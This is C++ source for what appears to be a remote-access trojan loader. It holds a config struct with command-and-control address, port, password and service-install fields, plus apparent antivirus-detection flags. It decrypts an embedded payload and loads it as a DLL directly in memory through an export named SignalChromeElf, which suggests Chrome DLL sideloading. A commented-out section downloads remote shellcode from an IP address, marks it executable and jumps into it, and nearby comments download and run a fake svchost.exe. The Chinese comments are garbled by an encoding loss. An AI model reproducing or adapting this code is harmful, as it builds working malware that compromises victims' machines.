#include "stdafx.h"

#include "../Install/ShellCode.h"
#include "../Install/MemLoadDll.h"

struct DLL_INFO
{
	char LoginAddr[30];     // ���ߵ�ַ 1  
	UINT LoginPort;         // ���߶˿� 2
	WORD FileAttribute;     // �ļ����� 3
	char UpGroup[30];       // ���߷��� 4
	char ConnetPass[20];    // ͨѶ��Կ 5
	TCHAR ReleaseName[25];  // ��װ���� 6
	char ServiceName[70];   // �������� 7
	char ServiceDisplayName[70]; // ������ʾ 8
	char ServiceDescription[120];// �������� 9
	char ReleasePath[100];  // ��װ·�� 10
	CHAR szDownRun[150];    // �����ַ 11
	char Dele_zc;           // �������� 12
	BOOL Fwb;               // ΢�� 13
	BOOL Fhb;               // ���� 14
	BOOL Fxn;               // ���� 15
	BOOL Ffx;               // ���� 16
	BOOL Fsc;               // ��ɾ 17
	BOOL Fzs;               // ��ɾ 18
	BOOL Fcf;               // �ظ� 19
	BOOL Ffh;               // ���� 20
	BOOL Fct;               // ��͸ 21
	BOOL Fzj;               // �ս� 22
	BOOL Fkb;               // ���� 23
	BOOL Fsm;               // ˯�� 24
	BOOL Flx;               // ���� 25
	BOOL Fwr;               // ΢�� 26
}dll_info = 
{
	"SVP7",       // ���ߵ�ַ 1
		0,        // ���߶˿� 2
		0,        // �ļ����� 3
		"",       // ���߷��� 4
		"",       // ͨѶ���� 5
		"",       // ��װ���� 6
		"",       // �������� 7
		"",       // ������ʾ 8
		"",	      // �������� 9
		"",       // ��װ;�� 10
		"",       // �������� 11
		0,        // �������� 12
		0,        // 0�ر� 1���� ΢����� 13
		0,        // 0�ر� 1���� ������� 14
		0,        // 0�ر� 1���� ������ 15
		0,        // 0�ر� 1���� ������� 16
		0,        // 0�ر� 1���� ��ɾ��� 17
		0,        // 0�ر� 1���� ��ɾ��� 18
		0,        // 0�ر� 1���� �ظ���� 19
		0,        // 0�ر� 1���� ������ 20
		0,        // 0�ر� 1���� ��͸��� 21
		0,        // 0�ر� 1���� �ս��� 22
		0,        // 0�ر� 1���� ������ 23
		0,        // 0�ر� 1���� ˯�߼�� 24
		0,        // 0�ر� 1���� ���߼�� 25
		0,        // 0�ر� 1���� ΢��ɱ�� 26
};

void EncryptData(char *szRec,long nLen,long key) //���ܲ��
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
typedef int (WINAPI *SB360RUN)(DLL_INFO);
void LoadLib( const char *name)
{
	HMEMORYMODULE hDll;
	SB360RUN pfn;
	EncryptData ((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize,1024);	
	hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);
	if (hDll==NULL)
		return ;
	pfn=(SB360RUN)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll=NULL;
		
	}
	ExitProcess(0);	
}
/*
#include "stdafx.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#pragma comment(lib, "wininet.lib")
void DownloadFile(const std::string& url, const std::string& filePath)
{
    HINTERNET hInternet = InternetOpen("DownloadApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        std::cout << "�޷���Internet����" << std::endl;
        return;
    }
    HINTERNET hURL = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hURL == NULL)
    {
        std::cout << "�޷���URL: " << url << std::endl;
		//����urlԶ������ ����zip
        InternetCloseHandle(hInternet);
        return;
    }
    HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::cout << "�޷������ļ�: " << filePath << std::endl;
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInternet);
        return;
    }
    char buffer[4096];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hURL, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }
    CloseHandle(hFile);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);
    std::cout << "�ļ����سɹ�: " << filePath << std::endl;
}

#include<windows.h> 
#include<urlmon.h> //������Բ�Ҫ 
#include<process.h> //������Բ�Ҫ 
#include<Shellapi.h> //����Ƕ�ShellExecute�Ķ��� 
#pragma comment (lib,"Urlmon.lib") //���Ҳ���Բ�Ҫ����DLL������


extern "C" __declspec(dllexport) LPVOID SignalChromeElf()

	{

	
	//	URLDownloadToFile(NULL,"http://��ַ/svchost.exe","C:\\svchost.exe",0,NULL); 
		//������ľ��ĵ�ַ�������ǵĺ���С�������浽C:\test.exe 
	//	Sleep(5000);
	//	ShellExecute(0,"open","c:\\svchost.exe",NULL,NULL,SW_SHOW); 
		//ִ��test.exe 


	URLDownloadToFile(NULL,"http://192.168.56.128/shell.txt","C:\\ProgramData\shell.txt",0,NULL); 
	


	HANDLE fp;
	unsigned char *fBuffer;
	DWORD fSize, dwSize;
	fp = CreateFile("C:\\ProgramData\\shell.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	fSize = GetFileSize(fp, 0);
	unsigned char *readBuffer = (unsigned char *)malloc(fSize);
	ReadFile(fp, readBuffer, fSize, &dwSize, 0);
	CloseHandle(fp);
	HANDLE hFileMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, fSize, NULL);
	if (hFileMapping == NULL)
	{
		// Handle error
	}
	fBuffer = (unsigned char *)MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, fSize);
	if (fBuffer == NULL)
	{
		// Handle error
	}	
	memcpy(fBuffer, readBuffer, fSize);
	DWORD oldProtect;
	VirtualProtect(fBuffer, fSize, PAGE_EXECUTE_READ, &oldProtect);
	_asm
	{
		pushad;
		mov eax, fBuffer;
		call eax;
		popad;
	}
	// Restore memory region protection
	VirtualProtect(fBuffer, fSize, oldProtect, &oldProtect);
	// Free the memory
	UnmapViewOfFile(fBuffer);
	CloseHandle(hFileMapping);
	
	return 0;
}*/


extern "C" __declspec(dllexport) LPVOID SignalChromeElf()
{

		char SVP7[]={'S','V','P','7','\0'};
		LoadLib(SVP7);
		return 0;
	
}



